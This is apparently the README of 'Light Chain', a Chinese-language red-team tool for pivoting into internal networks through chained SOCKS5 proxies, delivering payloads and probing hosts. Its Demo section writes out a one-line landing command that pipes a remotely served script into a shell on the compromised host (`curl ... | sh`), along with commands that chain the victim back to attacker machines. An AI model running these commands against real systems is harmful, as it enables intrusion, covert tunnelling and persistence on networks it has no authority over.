# Light Chain

![version](https://img.shields.io/github/v/release/MayMistery/LightChain?include_prereleases&label=version)
![license](https://img.shields.io/github/license/MayMistery/LightChain?color=FF5531)

红队工具，内网前哨站。轻量化，支持多级正、反向代理；载荷投递、落地；可以进行主、被动内网探测。

## Features

- socks5多级代理
- 长链路载荷投递一间落地
 

## Todo
- [ ] 增加端口转发
- [ ] 优化tcp载荷投递
- [ ] 增加一键部署脚本
- [ ] 考虑增加udp载荷投递
- [ ] 优化多级代理时的载荷投递时的参数配置
- [ ] 增加socks5代理
- [ ] 增加-d后台运行
- [ ] 增加日志输出（可配置
- [ ] 增加权限维持手段

# Demo(预期)

- 攻击机（公网）`lChain -srv eth0 8888`
- 攻击机（无公网ip）`lChain -srv eth0 -local 8888`
读取配置文件cfg.ini中的公网机ssh配置，利用ssh进行远端端口转发搭建公网服务
- 宿主端一键落地 `curl http://host:post/dep.sh | sh`（服务端运行时生成dep.sh）
- 宿主端 `lChain -slv eth0 -C '121.*.*.1:8888,121.*.*.2:8888' 8888`(部署在eth0网卡上，-C从宿主机到攻击机路径)


## Contributor

<a href="https://github.com/MayMistery/LightChain/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=MayMistery/LightChain" />
</a>